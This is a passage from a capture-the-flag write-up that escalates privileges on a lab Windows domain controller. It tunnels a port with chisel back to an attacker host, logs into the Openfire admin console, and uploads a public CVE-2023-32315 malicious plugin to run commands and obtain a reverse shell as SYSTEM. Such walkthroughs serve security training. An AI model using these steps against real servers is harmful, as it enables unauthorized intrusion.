2024/02/26 10:23:10 server: Fingerprint vHVbayM11hi8i17ygaO5K3kSMidClDNlzIgiaAu36wA=
2024/02/26 10:23:10 server: Listening on http://0.0.0.0:8000
2024/02/26 10:23:11 server: session#1: tun: proxy#R:9090=>9090: Listening

# On the victim
> .\chisel64.exe client 10.10.xxx.xxx:8000 R:9090
```
Browse port 9090 in your machine with Firefox, turns out this is the Openfire administration console. You can login using `svc_openfire` credentials.

![jab Untitled6](https://github.com/g1vi/AllTheWriteUps/assets/120142960/6777be29-d991-4625-909f-a187306f2590)

Notice the running version is 4.7.5, and we are allowed to upload plugins.

![jab Untitled7](https://github.com/g1vi/AllTheWriteUps/assets/120142960/415314de-98df-44b0-9d60-768ab4494c9a)

All that's left is find a way of uploading a malicious plugin. Looking for vulnerabilities I came across this POC https://github.com/miko550/CVE-2023-32315, which is linked to this CVE https://www.cvedetails.com/cve/CVE-2023-32315/<br>
<br>
Just follow the POC instructions, download the `.jar` plugin and upload into the "Plugins" section. Take note of the pass "123".<br>
<br>
Now navigate to `server -> server settings -> management tool`, and enter the pass "123". In the dropdown menu select "program home page" and take the opportunity to enumerate the system.
```markdown
server name 	127.0.0.1
server port 	9090
operating system 	Windows Server 2019 10.0 null
Current username 	DC01$
Current user directory 	null
Current user working directory 	C:\Program Files\Openfire\bin
Program relative path 	/plugins/openfire-management-tool-plugin/cmd.jsp
Absolute program path 	C:\Program Files\Openfire\plugins\admin\webapp\plugins
Network protocol 	HTTP/1.1
Server software version information 	jetty/9.4.43.v20210629
JDK version 	null
JDK installation path 	null
JAVA virtual machine version 	null
JAVA virtual machine name 	Java HotSpot(TM) 64-Bit Server VM
JAVA class path 	null
JAVA load library search path 	c:\program files\java\jre-1.8\bin;C:\Program Files (x86)\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\ProgramData\chocolatey\bin;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
JAVA temporary directory 	C:\Windows\TEMP\
JIT compiler name 	
extended directory path 	c:\program files\java\jre-1.8\lib\ext;C:\Windows\Sun\Java\lib\ext
Client Information
client address 	127.0.0.1
service machine name 	127.0.0.1
Username 	
Request method 	http
Apply Secure Sockets Layer 	No
```
Move to the "system command" in the dropdown menu, here you can issue commands such as a `powershell –e` reverse shell or whatever shell you like. After issuing your favourite reverse shell payload, a system prompt is received on the listener.

![jab Untitled8](https://github.com/g1vi/AllTheWriteUps/assets/120142960/26a31701-9fb3-430e-a6d9-ee3045371176)

You are root.
